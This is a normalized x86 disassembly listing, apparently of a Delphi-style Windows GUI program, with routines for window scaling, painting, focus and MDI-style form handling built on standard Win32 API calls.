je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_41db98
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_41dba0
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_44fe19
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43b2ac
push 0x0
push 0x0
push ebx
push sub_44ff20
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_44feec
push ebx
push sub_44ff04
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_44fecb
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_417ca8
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_4378d8
sub_44ff57
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44f214
mov ecx edi
mov edx esi
mov eax ebx
call sub_43da30
mov eax ebx
call sub_450040
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_41dc3c
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_41dc58
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4371f4
mov ebp eax
push edi
push esi
mov eax ebx
call sub_4371b0
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_4502e8
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_450318
sub_44ffe4
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_43df6c
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_43e270
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_452344
push eax
push 0x1
push 0x80
mov eax ebx
call sub_43df6c
push eax
call SendMessageA
pop ebx
retn
sub_450078
push ebx
mov ebx eax
mov eax ebx
call sub_450f94
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_45010c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43df6c
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_43e034
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_43df6c
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_43df6c
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_450194
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_43e4cc
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_41af68
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41af3c
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403490
test al al
jne r-xdata
sub_450200
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_4031dc
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45022c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax ebp
call sub_43ac9c
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_41af68
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_43e514
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_41af3c
mov si 0xfff1
call sub_403490
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_41af78
jmp r-xdata
sub_4502c0
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_437994
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_438978
sub_4502e8
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_4371c8
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_450318
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43720c
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_450348
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_4376cc
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_451480
pop esi
pop ebx
retn
sub_45038c
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_4503e5
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4503ec
lea eax [ ebp - 0x4 ]
call sub_404050
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
sub_4503f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_437680
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_43b4c4
mov eax ebx
call sub_43b660
sub_45042c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_41adb4
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_45046c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43b980
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403490
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403490
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_438978
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_438978
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_438978
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_438978
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_438978
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_438978
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_44a570
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_450d98
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e2d4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4506e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4506c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41e984
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41e824
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_44ba58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4506cf
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41e984
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_44a570
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_450d98
call sub_43df6c
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_450813
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e2d4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4507ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4507cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41e984
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41e824
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4507d6
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41e984
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_43df6c
mov esi eax
sub_4507f3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call ReleaseDC
retn
sub_4508a4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_4508f0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_450dcc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_450e18
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_450930
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_450afe
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41e1b8
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43bc20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_4372f0
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4360e8
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_4508a4
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41e1b8
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_450dcc
test eax eax
je r-xdata
push ebp
call sub_4508a4
pop ecx
push ebp
call sub_4508a4
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_4508f0
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_44dc08
jmp r-xdata
sub_450b10
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_44edd8
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_450b7c
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_44f474
mov eax ebx
call sub_43e270
test al al
je r-xdata
mov eax ebx
call sub_41af68
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_43df6c
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_43ad90
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_43df6c
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_41af3c
call sub_44b0b4
mov edx esi
mov eax ebx
call sub_41af3c
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
sub_450c14
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_450c91
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_450c9c
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43b50c
sub_450cc8
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_43b50c
xor edx edx
jmp r-xdata
mov eax esi
call sub_44ef54
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_450d00
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_436fb0
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_43b50c
sub_450d44
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_4370bc
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_450d98
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_43468c
sub_450dcc
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45493c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_454928
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_450e18
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45493c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_454928
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_450e68
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_414014
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_450e98
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_43df6c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_45490c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_45490c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_450e68
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_45490c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4548f8
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_414170
call sub_403294
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4548f8
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4548f8
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4548f8
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_450f9c
push ebx
mov ebx eax
mov eax ebx
call sub_450f94
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_4229c8
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_450fc4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_43b4c4
mov dl 0x1
mov eax esi
call sub_451328
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
